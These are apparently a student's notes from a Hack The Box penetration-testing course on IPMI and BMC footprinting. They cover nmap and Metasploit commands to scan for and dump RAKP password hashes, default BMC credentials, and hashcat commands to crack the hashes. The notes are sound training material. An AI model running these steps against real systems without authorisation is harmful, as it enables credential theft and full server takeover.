
`Intelligent Platform Management Interface` (IPMI)

https://academy.hackthebox.com/module/112/section/1245

1- _IPMI is a hardware solution for controlling and managing your servers_.
2- is **a standardized message-based hardware management interface**. At the core of the IPMI is a hardware chip that is known as the Baseboard Management Controller (BMC), or Management Controller (MC)
![[ipmi2.jpg]]

3-IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.

4- does not require access to the operating system via a login shell.
5- Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band

## Footprinting the Service

port 623 UDP

1- Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs).
2- BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard


```shell
${Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.}
```
```shell
AhmaDb0x@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

```shell
msf6 > `use auxiliary/scanner/ipmi/ipmi_version` 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
```

`During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:`

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|
`It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.`


**Network Accessibility**:

- BMCs are usually assigned IP addresses, either manually or via DHCP, to enable remote access through web interfaces, SSH, or Telnet.
- If these interfaces are exposed to insecure networks (e.g., the public internet or poorly segmented internal networks), attackers can attempt to log in using the default credentials.
Accessing the BMC via the web interface using default credentials provides a GUI to manage the server, view hardware health, or access virtual KVM (keyboard, video, mouse) for console redirection.

### **Implications of Unauthorized Access**

- **System Control**: Attackers can power servers on/off, modify configurations, or access virtual consoles to interfere with or monitor operations.
- **Data Breach**: BMCs often provide access to the main system's hardware and storage, enabling attackers to access sensitive data.
- **Persistence**: Attackers can use the BMC as a backdoor to re-enter the system, even if the operating system is secured or reinstalled.


# Dangerous Settings

The _RAKP protocol_ in the IPMI specification allows anyone to use IPMI commands to grab a HMAC IPMI password hash that can be cracked offline.in `IPMI 2.0`

how ?
During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.

`Hash-based message authentication code (or HMAC)`


The RAKP protocol prioritizes performance over security. By design:
The critical flaw is in **Step 2**, where the server sends a hash of the user's password (salted SHA-1/MD5). Here’s why it’s problematic:

1. **Hash Leaks Sensitive Data**:
    
    - By providing a salted hash of the password, the server gives attackers a valuable piece of information that can be used for **offline brute-forcing** or **dictionary attacks**.
    - If an attacker intercepts this exchange (e.g., via a man-in-the-middle attack or by sniffing traffic), they can take the hash and work on cracking it offline.


This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.

It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.


#### Metasploit Dumping Hashes

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 


PASS_FILE            /usr/share/metasploitframework/data/wordlists/ipmi_passwords.txt


USER_FILE            
/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt  




`use auxiliary/scanner/ipmi/ipmi_login`


```

`$rakp$*5*admin*5ec6936b82000000*ea0a78fc8d33a6d34825209f47e8e0cb81525b1cd20f1c366017dee3e6aa377ea123456789abcdefa123456789abcdef140561646d696e251ab377e35f8d0f61dbf603c8adf6673d208886`

- `$rakp$`: Indicates the hash type.
- `5`: IPMI RAKP mode (constant for this attack).
- `admin`: The username.
- `Salt`: `5ec6936b82000000...`
- `HMAC`: The rest of the hash.

	`hashcat -m 7300 -a 0 hashfile.txt wordlist.txt`